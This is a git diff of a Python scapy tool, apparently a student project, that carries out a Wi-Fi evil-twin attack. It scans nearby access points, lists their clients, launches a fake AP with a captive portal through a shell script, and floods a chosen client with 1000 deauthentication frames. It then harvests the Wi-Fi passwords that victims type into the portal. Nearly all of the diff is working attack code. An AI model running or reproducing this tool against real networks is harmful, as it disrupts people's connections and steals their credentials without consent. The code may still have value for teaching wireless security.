@@ -1,23 +1,70 @@
 from scapy.all import *
 from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
-from scapy.layers.l2 import Ether
-from scapy.layers.inet import IP
 from scapy.config import conf
 from threading import Thread
 import pandas
 import time
-import pdb
 import os
+from loguru import logger
+from subprocess import run
+from simple_term_menu import TerminalMenu
+from functools import wraps
 
+OUTPUT_PATH = os.path.join("captive_portal", "nohup.out")
 # initialize the networks dataframe that will contain all access points nearby
-networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
+networks = pandas.DataFrame(
+    columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"]
+)
 # set the index BSSID (MAC address of the AP)
 networks.set_index("BSSID", inplace=True)
 
 isSniffing = True
+isPrinting = True
+check_fake_ap_connections = True
 
-bssid_to_scan = ''
+bssid_to_scan = ""
 clients = set()
+
+
+def retry_on_error(max_retries):
+    def decorator_func(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            attempts = 0
+            while attempts < max_retries:
+                try:
+                    result = func(*args, **kwargs)
+                    if len(result) > 0:
+                        return result
+                    time.sleep(0.5)
+                    attempts += 1
+                except Exception as e:
+                    print(f"Error: {e}")
+                    attempts += 1
+                    print(f"Retrying... ({attempts}/{max_retries})")
+                    time.sleep(1)
+            print (f"Failed reading password after {max_retries} attempts")
+            return None
+        return wrapper
+    return decorator_func
+
+
+# check for connection on the fake ap
+def check_for_connection():
+    conn = []
+    while check_fake_ap_connections:
+        out = run(
+            'systemctl status hostapd | grep "starting accounting session"',
+            capture_output=True,
+            shell=True,
+            text=True,
+        ).stdout
+        for line in out.splitlines():
+            client_mac = line.split()[7]
+            if client_mac not in conn:
+                conn.append(client_mac)
+                logger.info(f"\n{client_mac} Client connected!")
+        time.sleep(1)
 
 
 def callback(packet):
@@ -38,10 +85,23 @@ def callback(packet):
         crypto = stats.get("crypto")
         networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
 
+def validate_essid(essid):
+    new_essid = '\"'
+    for c in essid:
+        if c == '"':
+            new_essid += '\\"'
+        else:
+            new_essid += c
+    new_essid += '\"'
+    return new_essid
+
+
+
 
 def print_APs():
-    while isSniffing:
+    while isPrinting:
         os.system("clear")
+        logger.info("Start scanning networks...")
         print(networks)
         time.sleep(0.5)
 
@@ -63,17 +123,24 @@ def change_channel():
 
 
 def get_AP_clients(pkt):
-    if pkt.haslayer(Dot11):
-        client_mac = ''
-        if pkt.type == 2:
-            from_ds = pkt[Dot11].FCfield & 0x1 != 0
-            to_ds = pkt[Dot11].FCfield & 0x2 != 0
-            if to_ds and not from_ds and pkt.addr2 == bssid_to_scan:
-                client_mac = pkt.addr1
-            if from_ds and not to_ds and pkt.addr1 == bssid_to_scan:
-                client_mac = pkt.addr2
-            if client_mac:
-                clients.add(client_mac)
+    valid_bssid = [bssid_to_scan]
+    if pkt.haslayer(Dot11) and pkt.type == 2:
+        client_mac = None
+        DS = pkt.FCfield & 0x3
+        to_ds = DS & 0x01 != 0
+        from_ds = DS & 0x2 != 0
+        # print (f"pkt[Dot11].FCfield: {pkt[Dot11].FCfield}")
+        # print (f"from_ds: {from_ds}, to_ds: {to_ds}")
+        # print (f"pkt.addr1: {pkt.addr1}, pkt.addr2: {pkt.addr2}, pkt.addr3: {pkt.addr3}")
+        if to_ds and not from_ds and pkt.addr1 in valid_bssid:
+            client_mac = pkt.addr2
+        elif from_ds and not to_ds and pkt.addr2 in valid_bssid:
+            client_mac = pkt.addr3
+        elif not from_ds and not to_ds and pkt.addr1 in valid_bssid:
+            client_mac = pkt.addr2
+
+        if client_mac:
+            clients.add(client_mac)
 
 
 def deauth_target(target_mac, twin_mac):
@@ -82,9 +149,25 @@ def deauth_target(target_mac, twin_mac):
     sendp(pkt, inter=0.1, count=1000, iface=conf.iface, verbose=1)
 
 
+@retry_on_error(3)
+def read_nohup_output():
+    received_passwords = set()
+
+    if not os.path.exists(OUTPUT_PATH):
+        return received_passwords
+
+    with open(OUTPUT_PATH, "r") as f:
+        for line in f:
+            if "This is the password" in line:
+                received_passwords.add(line.split("This is the password")[-1])
+
+    return received_passwords
+
+
 if __name__ == "__main__":
-    # interface name, check using iwconfig
-    conf.iface = "wlxc83a35c2e0bb"
+    conf.iface = os.getenv("ATTACK_INTERFACE")
+    logger.info(f"using interface: {conf.iface}")
+
     # start the thread that prints all the networks
     printer = Thread(target=print_APs)
     printer.daemon = True
@@ -92,21 +175,45 @@ if __name__ == "__main__":
     # start the channel changer
     channel_changer = Thread(target=change_channel)
     channel_changer.start()
-    print("Start scanning networks")
     # start sniffing
     sniff(prn=callback, monitor=True, timeout=10)
-    isSniffing = False
+    isPrinting = False
 
-    # bssid_to_scan = networks[networks["SSID"] == "Ariel-University-2.4"].index[0]
-    print("Enter mac address of AP to sacn")
-    bssid_to_scan = input()
+    logger.info("Please choose a network (SSID) to scan clients from: ")
 
-    print(f'Start scanning clients on {bssid_to_scan}')
-    sniff(prn=get_AP_clients, monitor=True, stop_filter=lambda x: len(clients) > 0, timeout=120)
+    ssid_to_scan = input()
+    bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
 
-    print(f"clients connected to the AP you choose: {clients}")
+    logger.info(f'Start scanning clients on "{ssid_to_scan}" {bssid_to_scan}')
+    sniff(prn=get_AP_clients, monitor=True, timeout=20)
+    isSniffing = False  # for the change_channel thread
 
-    target_mac = input("Enter target mac: ")
+    if len(clients) == 0:
+        logger.info("There is not clients on the Access point you choose, Please run again and choose another one")
+        exit(0)
+
+    os.system(f"./rerouting_magic.sh --ssid {validate_essid(ssid_to_scan)}")
+
+    # start the thread that prints all the connected clients
+    printer = Thread(target=check_for_connection)
+    printer.daemon = True
+    printer.start()
+
+    logger.info("please choose a client MAC to deauth: ")
+
+    # clients set to list
+    clients = list(clients)
+    terminal_menu = TerminalMenu(clients)
+    choice_index = terminal_menu.show()
+    target_mac = clients[choice_index]
+
     deauth_target(target_mac, bssid_to_scan)
 
-    pdb.set_trace()
+    check_fake_ap_connections = False
+
+    result = read_nohup_output()
+    if result:
+        print(result)
+    # pdb.set_trace()
+    # remove captive_portal/nohup.out
+    os.system("rm -f captive_portal/nohup.out")
